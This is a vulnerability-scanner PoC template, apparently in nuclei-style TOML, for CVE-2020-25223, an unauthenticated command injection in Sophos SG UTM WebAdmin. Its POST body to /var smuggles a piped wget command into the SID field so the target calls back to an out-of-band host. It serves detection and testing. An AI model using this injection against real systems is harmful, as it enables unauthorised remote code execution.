[info]
author = "ave"
description = "Sophos SG UTM WebAdmin 组件存在 OS 命令注入漏洞，未经身份认证的攻击者可通过 POST 请求向 /var 端点发送特制 JSON 载荷，在 SID 字段中注入系统命令，实现远程代码执行。通过 OOB 方式检测命令执行结果。"
id = "POC-AVE-2020-1100"
name = "Sophos SG UTM WebAdmin 远程代码执行 PoC"
severity = "critical"
tags = [
    "cve-2020-25223",
    "sophos",
    "rce",
    "oast",
    "unauth",
]
vuln_id = [
    "CVE-2020-25223",
    "AVE-2020-1100",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/var"
protocol = "http"

[poc.requests.body]
content = '{"objs": [{"FID": "init"}], "SID": "|wget http://{{interactsh-url}}|", "browser": "gecko_linux", "backend_version": -1, "loc": "", "_cookie": null, "wdebug": 0, "RID": "1629210675639_0.5000855117488202", "current_uuid": "", "ipv6": true}'
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
